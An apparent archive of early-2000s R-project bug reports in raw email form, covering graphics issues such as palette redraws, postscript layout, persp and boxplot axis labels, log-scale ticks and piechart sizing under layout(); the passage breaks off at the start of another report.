Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA11349
	for <r-bugs@biostat.ku.dk>; Wed, 8 Aug 2001 19:07:58 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (really [130.225.108.193]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15UWoD-000JIvC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Wed, 8 Aug 2001 12:07:53 -0500 (CDT) 
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id f78H81o29218;
	Wed, 8 Aug 2001 19:08:01 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: r-bugs@r-project.org
Subject: Palette changes on redraw
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 08 Aug 2001 19:08:01 +0200
Message-ID: <x2snf2zdhq.fsf@blueberry.kubism.ku.dk>
Lines: 14
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Try this

example(palette)

then trigger a redraw e.g. by resizing the window. Shouldn't the
palette be stored as part of the display list?

(This only happens because the palette was reset at the end of the
example, but still...)
-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1045.reply.1 <==
From ihaka@stat.auckland.ac.nz  Wed Aug  8 22:36:29 2001
Received: from mailhost.auckland.ac.nz (mailhost.auckland.ac.nz [130.216.1.4] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA12009;
	Wed, 8 Aug 2001 22:36:26 +0200 (MET DST)
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id IAA21626;
	Thu, 9 Aug 2001 08:36:20 +1200 (NZST)
Received: from stat.auckland.ac.nz (g.ihaka.slip.auckland.ac.nz [130.216.9.243])
	by stat1.stat.auckland.ac.nz (8.10.2+Sun/8.8.8) with ESMTP id f78KaJ720404;
	Thu, 9 Aug 2001 08:36:19 +1200 (NZST)
Sender: ihaka@stat.auckland.ac.nz
Message-ID: <3B71A31A.8BB29F85@stat.auckland.ac.nz>
Date: Thu, 09 Aug 2001 08:37:46 +1200
From: Ross Ihaka <ihaka@stat.auckland.ac.nz>
Organization: University of Auckland
X-Mailer: Mozilla 4.76 [en] (X11; U; Linux 2.2.12 i386)
X-Accept-Language: en
MIME-Version: 1.0
To: p.dalgaard@biostat.ku.dk
CC: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Palette changes on redraw (PR#1045)
References: <200108081708.TAA11359@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

p.dalgaard@biostat.ku.dk wrote:
> 
> Try this
> 
> example(palette)
> 
> then trigger a redraw e.g. by resizing the window. Shouldn't the
> palette be stored as part of the display list?
> 
> (This only happens because the palette was reset at the end of the
> example, but still...)

I could argue either way on this.

I agree that its nasty to have plot colours change in mid-stream,
but I suspect that adding the palette to the display list may not
be the "right" solution.

A different approach would be to map the colour indices (and names)
to RGB values at a slightly higher level.  That way it would be the
RGB values which would be captured in the display list, not the
indices.

[ I'm afraid that I think that the whole display list mechanism is
  "wrong".  We need a much higher level way of describing plots. ]

	Ross

==> 1045.audit <==
Sat Aug 11 09:57:42 2001	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1147 *
Subject: postscript problem
From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
Date: Fri, 26 Oct 2001 15:23:45 -0400
--This seems to be a problem with screen/layout rather than postscript.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1147 <==
From postmaster@franz.stat.wisc.edu  Fri Oct 26 21:23:17 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA03528
	for <r-bugs@biostat.ku.dk>; Fri, 26 Oct 2001 21:23:16 +0200 (MET DST)
Received: from jupiter.umsanet.edu.bo (really [166.114.17.11]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15xCZT-000JIvC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Fri, 26 Oct 2001 14:23:11 -0500 (CDT) 
Received: from umsanet.edu.bo (pc69.umsanet.edu.bo [166.114.17.69])
	by jupiter.umsanet.edu.bo (8.11.0/8.9.3) with ESMTP id f9QJZjK01812
	for <r-bugs@r-project.org>; Fri, 26 Oct 2001 15:35:47 -0400
Message-ID: <3BD9B841.215F6DB3@umsanet.edu.bo>
Date: Fri, 26 Oct 2001 15:23:45 -0400
From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
Reply-To: kjetilh@umsanet.edu.bo
Organization: UMSA
X-Mailer: Mozilla 4.7 [en] (Win98; I)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@r-project.org
Subject: postscript problem
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

I reported this earlier, and have got reports that others have the same
promlem on UNIX machines, so it is not only a windows problem
S I file a bug report.

The function (boot.stat) given at the end produces a postscript file, 
which cannot be included correctly in LaTeX. Specifically, 
the image in LaTeX (when translated by dvips to postscript)
becomes very small, not using the bounding box, and turned on its head!

Kjetil Halvorsen

boot.stat <-
function (x, B = 1000, norm = FALSE) 
{
    xname <- deparse(substitute(x))
    means <- meds <- numeric(B)
    for (i in 1:B) {
        s <- sample(x, replace = TRUE)
        means[i] <- mean(s)
        meds[i] <- median(s)
    }
    CImedian <- quantile(meds, c(0.025, 0.5, 0.975))
    CImean <- quantile(means, c(0.025, 0.5, 0.975))
    hmean <- hist(means, freq = FALSE, plot = FALSE)
    hmeds <- hist(meds, freq = FALSE, plot = FALSE)
    split.screen(c(1, 2))
    xlims <- range(c(hmean$breaks, hmeds$breaks))
    ymax <- max(c(hmean$density, hmeds$density))
    screen(1)
    plot(hmean, freq = FALSE, col = "red", xlim = xlims, ylim = c(0, 
        ymax), xlab = paste("Sampling dist. of mean of ", xname), 
        main = "")
    if (norm) {
        n <- length(x)
        mu <- mean(x)
        sd <- sqrt(var(x)/n)
        ps <- seq(xlims[1], xlims[2], len = 100)
        lines(ps, dnorm(ps, mu, sd), col = "darkgreen")
    }
    lines(CImean, rep(ymax/2, 3))
    points(CImean[2], ymax/2, cex = 2, col = "black")
    screen(2)
    plot(hmeds, freq = FALSE, col = "lightblue", xlim = xlims, 
        ylim = c(0, ymax), xlab = paste("Sampling dist. of median of ",
            xname), main = "")
    if (norm) {
        n <- length(x)
        p <- 1/2
        mu <- median(x)
        d <- density(x, n = 1, from = mu, to = mu)$y
        sd <- sqrt(p * (1 - p)/n)/d
        ps <- seq(xlims[1], xlims[2], len = 100)
        lines(ps, dnorm(ps, mu, sd), col = "darkgreen")
    }
    lines(CImedian, rep(ymax/2, 3))
    points(CImedian[2], ymax/2, cex = 2, col = "black")
    names(B) <- "Number of bootstrap replicactions"
    invisible(list(CImean = CImean, CImedian = CImedian, B, means =
means, 
        meds = meds))
}


call with for example

boot.stat( rnorm(100), norm=TRUE)

==> 1147.audit <==
Wed Oct 31 15:17:18 2001	ripley	changed notes
Wed Oct 31 15:17:18 2001	ripley	foobar
Wed Oct 31 15:17:18 2001	ripley	moved from incoming to Graphics

==> 1147.followup.1 <==
From postmaster@franz.stat.wisc.edu Thu Feb  7 16:39:12 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA05430
	for <r-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 16:39:09 +0100 (MET)
Received: from jupiter.umsanet.edu.bo (really [166.114.17.11]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16YqdA-000IbFC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Thu, 7 Feb 2002 09:38:36 -0600 (CST) 
Received: from umsanet.edu.bo (antiguo31.umsanet.edu.bo [192.168.14.31])
	by jupiter.umsanet.edu.bo (8.11.0/8.9.3) with ESMTP id g17FqWW23666
	for <r-bugs@r-project.org>; Thu, 7 Feb 2002 11:52:33 -0400
Message-ID: <3C629F2F.71DBBE02@umsanet.edu.bo>
Date: Thu, 07 Feb 2002 11:37:19 -0400
From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
Reply-To: kjetilh@umsanet.edu.bo
Organization: UMSA
X-Mailer: Mozilla 4.7 [en] (Win98; I)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@r-project.org
Subject: PR# 1147
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Content-Length: 328
Status: RO

Apropops todays automatic bug report: The bug #1147 I reported
(postscript, problems with screen layout) which I treported some time
ago, does not anymore occur R1.4.0, windows 98, when I test with the
same code that caused the original problem. Fixed as a by-product of the
internal changes to graphics code?

Kjetil Halvorsen

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1161 *
Subject: x-axis label in persp()
From: Rolf Turner <rolf@maths.uwa.edu.au>
Date: Wed, 7 Nov 2001 18:07:22 +0800 (WST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1161 <==
From postmaster@franz.stat.wisc.edu  Wed Nov  7 11:07:32 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA22526
	for <r-bugs@biostat.ku.dk>; Wed, 7 Nov 2001 11:07:32 +0100 (MET)
Received: from madvax.maths.uwa.edu.au (really [130.95.16.1]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m161PcE-000JLZC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Wed, 7 Nov 2001 04:07:26 -0600 (CST) 
Received: from salvia.maths.uwa.edu.au (salvia.maths.uwa.edu.au [130.95.16.72])
	by madvax.maths.uwa.edu.au (8.12.0/8.12.0) with ESMTP id fA7A7M7Z209411
	for <r-bugs@r-project.org>; Wed, 7 Nov 2001 18:07:23 +0800 (WST)
From: Rolf Turner <rolf@maths.uwa.edu.au>
Date: Wed, 7 Nov 2001 18:07:22 +0800 (WST)
Message-Id: <200111071007.SAA21120@salvia.maths.uwa.edu.au>
To: r-bugs@r-project.org
Subject: x-axis label in persp()


If the surface to be plotted by persp() is supplied as
a list, the x-axis label defaults to the name, in the call,
of this list --- which is usually silly.

I would suggest changing the first four lines of
persp.default() (where the x-axis label gets set) from

if (is.null(xlab))
        xlab <- if (!missing(x))
            deparse(substitute(x))
        else "X"

to

if (is.null(xlab))
        xlab <- if (!missing(x) && !is.list(x) && !is.matrix(x))
            deparse(substitute(x))
        else "X"

which makes the x-axis label default to "X" if the surface
is specified as a list.


					cheers,

						Rolf Turner

Current email address: rolf@maths.uwa.edu.au
Usual email address:   rolf@math.unb.ca

==> 1161.audit <==
Sun Nov 11 17:22:03 2001	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1207 *
Subject: boxplot labels incorrect when horizontal = TRUE
From: Rashid Nassar <rnassar@duke.edu>
Date: Sun, 9 Dec 2001 21:46:32 -0500 (EST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1207 <==
From rnassar@duke.edu  Mon Dec 10 03:47:18 2001
Received: from gibson.acpub.duke.edu (gibson.acpub.duke.edu [152.3.233.8])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id DAA19748
	for <r-bugs@biostat.ku.dk>; Mon, 10 Dec 2001 03:47:17 +0100 (MET)
Received: from godzilla5.acpub.duke.edu (rnassar@godzilla5.acpub.duke.edu [152.3.233.46]) 
        by gibson.acpub.duke.edu (8.11.5/8.11.3/Duke-5.0.0) with ESMTP id fBA2kYR03236 for <r-bugs@biostat.ku.dk>;
        Sun, 9 Dec 2001 21:46:34 -0500 (EST)
Received: (from rnassar@localhost)
	by godzilla5.acpub.duke.edu (8.9.3/8.9.3) id VAA28884;
	Sun, 9 Dec 2001 21:46:33 -0500 (EST)
Date: Sun, 9 Dec 2001 21:46:32 -0500 (EST)
From: Rashid Nassar <rnassar@duke.edu>
X-Sender: rnassar@godzilla5.acpub.duke.edu
To: r-bugs <r-bugs@biostat.ku.dk>
Subject: boxplot labels incorrect when horizontal = TRUE
Message-ID: <Pine.SOL.3.91.1011209214428.28790B-100000@godzilla5.acpub.duke.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
X-Virus-Scanned: by amavisd-milter, Duke University (http://amavis.org/)

#Example:

y <- rnorm(10)
group <- gl(2,5)

plot(y ~ group, horizontal = TRUE)  # BUG: default xlab & ylab interchanged
plot(y ~ group, horizontal = FALSE) # OK: supplies correct default xlab & ylab


# Using boxplot() instead of plot() omits default axis labels altogether
# (not sure if this is intentional):

boxplot(y ~ group, horizontal = FALSE) # no default axis labels supplied
boxplot(y ~ group, horizontal = TRUE)  # no default axis labels supplied

Thank you!

Rashid Nassar


--please do not edit the information below--

Version:
 platform = i586-pc-linux-gnu
 arch = i586
 os = linux-gnu
 system = i586, linux-gnu
 status = 
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R

Search Path:
 .GlobalEnv, Shoes, package:nls, package:nlme, package:ctest, Autoloads, 
package:base


==> 1207.audit <==
Mon Dec 10 08:21:15 2001	ripley	foobar
Mon Dec 10 08:21:15 2001	ripley	moved from incoming to Graphics

==> 1207.followup.1 <==
From ripley@stats.ox.ac.uk  Mon Dec 10 08:41:33 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA20814
	for <R-bugs@biostat.ku.dk>; Mon, 10 Dec 2001 08:41:32 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id HAA10031;
	Mon, 10 Dec 2001 07:41:26 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id fBA7fQZ09146;
	Mon, 10 Dec 2001 07:41:26 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Mon, 10 Dec 2001 07:41:26 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <rnassar@duke.edu>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] boxplot labels incorrect when horizontal = TRUE (PR#1207)
In-Reply-To: <200112100247.DAA19758@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0112100733010.9079-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Mon, 10 Dec 2001 rnassar@duke.edu wrote:

> #Example:
>
> y <- rnorm(10)
> group <- gl(2,5)
>
> plot(y ~ group, horizontal = TRUE)  # BUG: default xlab & ylab interchanged
> plot(y ~ group, horizontal = FALSE) # OK: supplies correct default xlab & ylab

Um.  That's plot.formula, not boxplot.  horizontal = TRUE is *not* a
documented argument to plot.formula.  If you pass arguments to boxplot
through ... (rather than just par values), you may well get unexpected
results.

To fix this needs plot.formula to recognize horizontal, and that's
an API change which I don't advocate during feature freeze.
Generally, not doing something which is not documented to happen is not a
bug, so I'll put this on the wishlist.

> # Using boxplot() instead of plot() omits default axis labels altogether
> # (not sure if this is intentional):
>
> boxplot(y ~ group, horizontal = FALSE) # no default axis labels supplied
> boxplot(y ~ group, horizontal = TRUE)  # no default axis labels supplied

Yes, it's intentional.  You can always use title().


-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1235 *
Subject: Axes labelling with logarithmic scales
From: tobias.hoevekamp@ilw.agrl.ethz.ch
Date: Thu, 3 Jan 2002 15:29:02 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1235 <==
From tobias.hoevekamp@ilw.agrl.ethz.ch  Thu Jan  3 15:29:03 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA25589
	for <R-bugs@biostat.ku.dk>; Thu, 3 Jan 2002 15:29:02 +0100 (MET)
Date: Thu, 3 Jan 2002 15:29:02 +0100 (MET)
From: tobias.hoevekamp@ilw.agrl.ethz.ch
Message-Id: <200201031429.PAA25589@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Axes labelling with logarithmic scales

Full_Name: Tobias Hoevekamp
Version: 1.4.0
OS: Debian GNU/Linux
Submission from: (NULL) (129.132.139.109)


There seems to be a problem with the labelling of axes when
logarithmic scales are used. More than half of 
both axes are not labeled in the following example:


x <-  c(0.12,  0.3,   0.53,  1.1,   1.8,  2.6, 4.5)
y <-  c(0.012, 0.021, 0.032, 0.055, 0.1,  0.2, 0.35)

plot(x, y,
     log="xy",
     main="Problem with axes labelling on logarithmic scales",
     xlab="x, why aren't 0.5, or even smaller tic-values displyed?",
     ylab="y, why isn't 0.05 diplayed?")


==> 1235.audit <==
Mon Jan  7 10:33:27 2002	ripley	foobar
Mon Jan  7 10:33:27 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1300 *
Subject: FW: layout and piechart diameter problem
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
Date: Thu, 7 Feb 2002 11:05:15 -0500 
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1300 <==
From gregory_r_warnes@groton.pfizer.com Thu Feb  7 17:06:56 2002
Received: from mailrelay1.pfizer.com (ns2.pfizer.com [192.77.198.2])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA05738
	for <r-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 17:06:55 +0100 (MET)
Received: from gsun56.pfizer.com (localhost [127.0.0.1])
	by mailrelay1.pfizer.com (8.9.3/Pro-8.9.3) with ESMTP id LAA25035
	for <r-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 11:05:53 -0500 (EST)
Received: from groexms02.pfizer.com (localhost [127.0.0.1])
	by gsun56.pfizer.com (Pro-8.9.3/Pro-8.9.3) with ESMTP id LAA08185
	for <r-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 11:07:32 -0500 (EST)
Received: from groexcncr01.pfizer.com (unverified) by groexms02.pfizer.com
 (Content Technologies SMTPRS 4.2.1) with ESMTP id <T58ecad88b1ac1e08e42e9@groexms02.pfizer.com> for <r-bugs@biostat.ku.dk>;
 Thu, 7 Feb 2002 11:05:17 -0500
Received: by groexcncr01.pfizer.com with Internet Mail Service (5.5.2654.89)
	id <1KVC00AM>; Thu, 7 Feb 2002 11:05:17 -0500
Message-ID: <5429125E11E4D411AF7300805FE603A8040DE623@groexmbcr02.pfizer.com>
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
To: "'R-bugs'" <r-bugs@biostat.ku.dk>
Subject: FW: layout and piechart diameter problem
Date: Thu, 7 Feb 2002 11:05:15 -0500 
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2654.89)
Content-Type: text/plain; charset="windows-1252"
Content-Length: 2315
Status: R


Third try...

>  -----Original Message-----
> From: 	Warnes, Gregory R  
> Sent:	Tuesday, February 05, 2002 4:12 PM
> To:	'R-bugs'
> Subject:	layout and piechart diameter problem
> 
> 
> I've been using layout to create some graphics pages which include pie
> charts.   (NB: No piechart arguments please, the main chart on the page is
> a proper bar chart representing the same information.)
> 
> When I plot pie charts in a column, the piechart at the top of a column is
> always smaller than the others:  
> 
> For example:
> 
> 	layout( matrix(c(1,1,2,
>                        1,1,3,
>                        1,1,4), ncol=3, byrow=T))
> 	for(i in 1:4) piechart( 1:3 )
> 
> In column 3, the first piechart has a radius something like 2/3 of the
> others.
> 
> This also happens for:
> 
> 	layout( matrix(c(1,2,
>                        1,3,
>                        1,4), ncol=2, byrow=T))
> 	for(i in 1:4) piechart( 1:3 )
> 
> 
> For this: 
> 
> 	layout( matrix(c(1,3,
>                        1,4,
>                        2,5), ncol=2, byrow=T))
> 	for(i in 1:5) piechart( 1:3 )
> 
> the piechart at the bottom left is smaller than the three in the second
> column:
> 
> 
> This occurs both on the x11 and postscript devices, although it is less
> noticeable on the latter.  It doesn't seem happen for 'hist' or 'plot'. As
> I've only recently started using layout, I don't know if this occurs with
> other plotting devices or commands.  
> 
> -Greg
> 
> ------
> 
> > version
>          _                   
> platform sparc-sun-solaris2.8
> arch     sparc               
> os       solaris2.8          
> system   sparc, solaris2.8   
> status                       
> major    1                   
> minor    4.1                 
> year     2002                
> month    01                  
> day      30                  
> language R                   
> 
> 


LEGAL NOTICE
Unless expressly stated otherwise, this message is confidential and may be privileged. It is intended for the addressee(s) only. Access to this E-mail by anyone else is unauthorized. If you are not an addressee, any disclosure or copying of the contents of this E-mail or any action taken (or not taken) in reliance on it is unauthorized and may be unlawful. If you are not an addressee, please inform the sender immediately.


==> 1300.followup.1 <==
From ligges@amadeus.statistik.uni-dortmund.de  Thu Feb  7 22:54:23 2002
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA07015
	for <R-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 22:54:23 +0100 (MET)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Thu, 7 Feb 2002 22:53:27 +0100
Received: from statistik.uni-dortmund.de (dial-142015.HRZ.Uni-Dortmund.DE [129.217.142.15])
	by amadeus.statistik.uni-dortmund.de (8.10.2+Sun/8.10.2) with ESMTP id g17LrPS08216;
	Thu, 7 Feb 2002 22:53:25 +0100 (MET)
Message-ID: <3C62F7A1.8BF78BAC@statistik.uni-dortmund.de>
Date: Thu, 07 Feb 2002 22:54:41 +0100
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
X-Mailer: Mozilla 4.79 [en] (Windows NT 5.0; U)
X-Accept-Language: en
MIME-Version: 1.0
To: gregory_r_warnes@groton.pfizer.com
CC: R-bugs@biostat.ku.dk
Subject: Re: [Rd] FW: layout and piechart diameter problem (PR#1300)
References: <200202071812.TAA06359@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

gregory_r_warnes@groton.pfizer.com wrote:
> 
> Third try...
> 
> >  -----Original Message-----
> > From:         Warnes, Gregory R
> > Sent: Tuesday, February 05, 2002 4:12 PM
> > To:   'R-bugs'
> > Subject:      layout and piechart diameter problem
> >
> >
> > I've been using layout to create some graphics pages which include pie
> > charts.   (NB: No piechart arguments please, the main chart on the page is
> > a proper bar chart representing the same information.)
> >
> > When I plot pie charts in a column, the piechart at the top of a column is
> > always smaller than the others:
> >
> > For example:
> >
> >       layout( matrix(c(1,1,2,
> >                        1,1,3,
> >                        1,1,4), ncol=3, byrow=T))
> >       for(i in 1:4) piechart( 1:3 )
> >
> > In column 3, the first piechart has a radius something like 2/3 of the
> > others.
> >
> > This also happens for:
> >
> >       layout( matrix(c(1,2,
> >                        1,3,
> >                        1,4), ncol=2, byrow=T))
> >       for(i in 1:4) piechart( 1:3 )
> >
> >
> > For this:
> >
> >       layout( matrix(c(1,3,
> >                        1,4,
> >                        2,5), ncol=2, byrow=T))
> >       for(i in 1:5) piechart( 1:3 )
> >
> > the piechart at the bottom left is smaller than the three in the second
> > column:
> >
> >
> > This occurs both on the x11 and postscript devices, although it is less
> > noticeable on the latter.  It doesn't seem happen for 'hist' or 'plot'. As
> > I've only recently started using layout, I don't know if this occurs with
> > other plotting devices or commands.

Probably only if the functions are making use of par("pin") (and friends
?) as piechart() does:

layout(matrix(c(1,1,2, 1,1,3, 1,1,4), ncol=3, byrow=TRUE))
par("pin")
plot(1); par("pin")  # Here it goes wrong for the next plot.
plot(1); par("pin")
plot(1); par("pin")
plot(1)


Uwe Ligges

==> 1300.followup.2 <==
From ligges@amadeus.statistik.uni-dortmund.de  Thu Feb  7 22:59:11 2002
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA07044
	for <R-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 22:59:11 +0100 (MET)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Thu, 7 Feb 2002 22:58:27 +0100
Received: from statistik.uni-dortmund.de (dial-142015.HRZ.Uni-Dortmund.DE [129.217.142.15])
	by amadeus.statistik.uni-dortmund.de (8.10.2+Sun/8.10.2) with ESMTP id g17LwQS08237;
	Thu, 7 Feb 2002 22:58:26 +0100 (MET)
Message-ID: <3C62F8CE.85E07095@statistik.uni-dortmund.de>
Date: Thu, 07 Feb 2002 22:59:42 +0100
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
X-Mailer: Mozilla 4.79 [en] (Windows NT 5.0; U)
X-Accept-Language: en
MIME-Version: 1.0
To: gregory_r_warnes@groton.pfizer.com, R-bugs@biostat.ku.dk
Subject: Re: [Rd] FW: layout and piechart diameter problem (PR#1300)
References: <200202071812.TAA06359@pubhealth.ku.dk> <3C62F7A1.8BF78BAC@statistik.uni-dortmund.de>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit



Uwe Ligges wrote:
> 
> gregory_r_warnes@groton.pfizer.com wrote:
> >
> > Third try...
> >
> > >  -----Original Message-----
> > > From:         Warnes, Gregory R
> > > Sent: Tuesday, February 05, 2002 4:12 PM
> > > To:   'R-bugs'
> > > Subject:      layout and piechart diameter problem
> > >
> > >
> > > I've been using layout to create some graphics pages which include pie
> > > charts.   (NB: No piechart arguments please, the main chart on the page is
> > > a proper bar chart representing the same information.)
> > >
> > > When I plot pie charts in a column, the piechart at the top of a column is
> > > always smaller than the others:
> > >
> > > For example:
> > >
> > >       layout( matrix(c(1,1,2,
> > >                        1,1,3,
> > >                        1,1,4), ncol=3, byrow=T))
> > >       for(i in 1:4) piechart( 1:3 )
> > >
> > > In column 3, the first piechart has a radius something like 2/3 of the
> > > others.
> > >
> > > This also happens for:
> > >
> > >       layout( matrix(c(1,2,
> > >                        1,3,
> > >                        1,4), ncol=2, byrow=T))
> > >       for(i in 1:4) piechart( 1:3 )
> > >
> > >
> > > For this:
> > >
> > >       layout( matrix(c(1,3,
> > >                        1,4,
> > >                        2,5), ncol=2, byrow=T))
> > >       for(i in 1:5) piechart( 1:3 )
> > >
> > > the piechart at the bottom left is smaller than the three in the second
> > > column:
> > >
> > >
> > > This occurs both on the x11 and postscript devices, although it is less
> > > noticeable on the latter.  It doesn't seem happen for 'hist' or 'plot'. As
> > > I've only recently started using layout, I don't know if this occurs with
> > > other plotting devices or commands.
> 
> Probably only if the functions are making use of par("pin") (and friends
> ?) as piechart() does:
> 
> layout(matrix(c(1,1,2, 1,1,3, 1,1,4), ncol=3, byrow=TRUE))
> par("pin")
> plot(1); par("pin")  # Here it goes wrong for the next plot.
> plot(1); par("pin")
> plot(1); par("pin")
> plot(1)

And let me add, it is everytime the second one:

layout(matrix(c(1,3, 1,4, 2,5), ncol=2, byrow=TRUE))
for(i in 1:5) piechart( 1:3 )

layout(matrix(c(1,2, 1,4, 3,5), ncol=2, byrow=TRUE))
for(i in 1:5) piechart( 1:3 )

layout(matrix(c(1,3, 1,2, 4,5), ncol=2, byrow=TRUE))
for(i in 1:5) piechart( 1:3 )

Uwe

==> 1300.audit <==
Mon Feb 11 21:37:01 2002	ripley	foobar
Mon Feb 11 21:37:01 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1395 *
Subject: mgp parameter in par()
From: mh.smith@niwa.cri.nz
Date: Tue, 19 Mar 2002 06:11:49 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1395 <==
From mh.smith@niwa.cri.nz  Tue Mar 19 06:11:51 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA29491
	for <R-bugs@biostat.ku.dk>; Tue, 19 Mar 2002 06:11:49 +0100 (MET)
Date: Tue, 19 Mar 2002 06:11:49 +0100 (MET)
From: mh.smith@niwa.cri.nz
Message-Id: <200203190511.GAA29491@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: mgp parameter in par()

Full_Name: Murray H Smith
Version: 1.4.1
